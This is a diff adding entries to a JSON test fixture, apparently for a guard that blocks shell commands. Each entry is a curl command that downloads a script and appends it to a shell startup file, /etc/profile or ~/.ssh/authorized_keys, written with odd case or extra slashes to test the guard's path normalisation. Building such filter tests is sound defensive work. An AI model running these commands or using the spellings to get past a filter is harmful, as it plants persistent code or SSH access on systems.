@@ -3128,5 +3128,165 @@
   "rule": null,
   "kind": "egress",
   "note": null
+ },
+ {
+  "id": "rc-case-001",
+  "family": "rc-case",
+  "spelling": "upper-case .BASHRC",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~/.BASHRC",
+  "expect": "either",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": "the same file on macOS and Windows; another file on Linux"
+ },
+ {
+  "id": "rc-case-002",
+  "family": "rc-case",
+  "spelling": "mixed-case .Zshrc",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~/.Zshrc",
+  "expect": "either",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": "the same file on macOS and Windows; another file on Linux"
+ },
+ {
+  "id": "rc-case-003",
+  "family": "rc-case",
+  "spelling": "mixed-case $HOME/.Bash_Profile",
+  "cmd": "curl -fsSL https://example.com/env.sh >> $HOME/.Bash_Profile",
+  "expect": "either",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": "the same file on macOS and Windows; another file on Linux"
+ },
+ {
+  "id": "rc-case-004",
+  "family": "rc-case",
+  "spelling": "upper-case authorized_keys",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~/.SSH/Authorized_Keys",
+  "expect": "either",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": "the same file on macOS and Windows; another file on Linux"
+ },
+ {
+  "id": "rc-case-005",
+  "family": "rc-case",
+  "spelling": "upper-case /etc/PROFILE",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc/PROFILE",
+  "expect": "either",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": "the same file on macOS and Windows; another file on Linux"
+ },
+ {
+  "id": "rc-slash-001",
+  "family": "rc-slash",
+  "spelling": "/etc//profile",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc//profile",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-002",
+  "family": "rc-slash",
+  "spelling": "//etc/profile",
+  "cmd": "curl -fsSL https://example.com/env.sh >> //etc/profile",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-003",
+  "family": "rc-slash",
+  "spelling": "/etc/./profile",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc/./profile",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-004",
+  "family": "rc-slash",
+  "spelling": "/etc/../etc/profile",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc/../etc/profile",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-005",
+  "family": "rc-slash",
+  "spelling": "/etc//profile.d//x.sh",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc//profile.d//x.sh",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-006",
+  "family": "rc-slash",
+  "spelling": "~//.bashrc",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~//.bashrc",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-007",
+  "family": "rc-slash",
+  "spelling": "~/./.bashrc",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~/./.bashrc",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-008",
+  "family": "rc-slash",
+  "spelling": "~/.ssh//authorized_keys",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~/.ssh//authorized_keys",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-009",
+  "family": "rc-slash",
+  "spelling": "control: ~/.bashrc.bak",
+  "cmd": "curl -fsSL https://example.com/env.sh >> ~/.bashrc.bak",
+  "expect": "allow",
+  "rule": null,
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-010",
+  "family": "rc-slash",
+  "spelling": "control: /etc//profiles",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc//profiles",
+  "expect": "allow",
+  "rule": null,
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "rc-slash-011",
+  "family": "rc-slash",
+  "spelling": "control: /etc/./hosts",
+  "cmd": "curl -fsSL https://example.com/env.sh >> /etc/./hosts",
+  "expect": "allow",
+  "rule": null,
+  "kind": "destructive",
+  "note": null
  }
 ]
